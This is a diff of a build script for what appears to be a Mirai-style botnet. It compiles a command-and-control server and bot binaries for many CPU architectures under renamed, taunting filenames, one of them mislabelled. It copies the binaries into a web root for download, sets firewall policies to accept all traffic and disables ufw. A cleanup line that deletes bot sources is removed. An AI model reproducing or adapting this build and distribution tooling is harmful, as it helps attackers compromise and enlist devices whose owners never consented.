@@ -41,29 +41,29 @@ go build cnc/*.go
 echo "Building - debug"
 compile_bot i586 debug.dbg "-static -DDEBUG"
 echo "Building - x86"
-compile_bot i586 main_x86 "-static"
+compile_bot i586 gang123isgodloluaintgettingthesebinslikedammwtf.x86 "-static"
 echo "Building - x86_64"
-compile_bot x86_64 main_x86_64 "-static"
+compile_bot x86_64 gang123isgodloluaintgettingthesebinslikedammwtf.x86_64 "-static"
 echo "Building - mips"
-compile_bot mips main_mips "-static"
+compile_bot mips gang123isgodloluaintgettingthesebinslikedammwtf.x86 "-static"
 echo "Building - mipsel"
-compile_bot mipsel main_mpsl "-static"
+compile_bot mipsel gang123isgodloluaintgettingthesebinslikedammwtf.mipsel "-static"
 echo "Building - armv4l"
-compile_bot armv4l main_arm "-static"
+compile_bot armv4l gang123isgodloluaintgettingthesebinslikedammwtf.armv4l "-static"
 echo "Building - armv5l"
-compile_bot armv5l main_arm5 "-static"
+compile_bot armv5l gang123isgodloluaintgettingthesebinslikedammwtf.armv5l "-static"
 echo "Building - armv6l"
-compile_bot armv6l main_arm6 "-static"
+compile_bot armv6l gang123isgodloluaintgettingthesebinslikedammwtf.armv6l "-static"
 echo "Building - armv7l"
-compile_bot_arm7 armv7l main_arm7 "-static"
+compile_bot_arm7 armv7l gang123isgodloluaintgettingthesebinslikedammwtf.armv7l "-static"
 echo "Building - powerpc"
-compile_bot powerpc main_ppc "-static"
+compile_bot powerpc gang123isgodloluaintgettingthesebinslikedammwtf.ppc "-static"
 echo "Building - m68k"
-compile_bot m68k main_m68k "-static"
+compile_bot m68k gang123isgodloluaintgettingthesebinslikedammwtf.m68k "-static"
 echo "Building - sh4"
-compile_bot sh4 main_sh4 "-static"
+compile_bot sh4 gang123isgodloluaintgettingthesebinslikedammwtf.sh4 "-static"
 echo "Building - sparc"
-compile_bot sparc main_spc "-static"
+compile_bot sparc gang123isgodloluaintgettingthesebinslikedammwtf.sparc "-static"
 
 cp index.html /var/www/html
 cp release/main_* /var/www/html
@@ -76,5 +76,4 @@ sudo iptables -P FORWARD ACCEPT
 sudo iptables -P OUTPUT ACCEPT
 sudo service iptables save
 sudo ufw disable
-rm -rf bot/ build.sh index.php
 echo "D o n e"
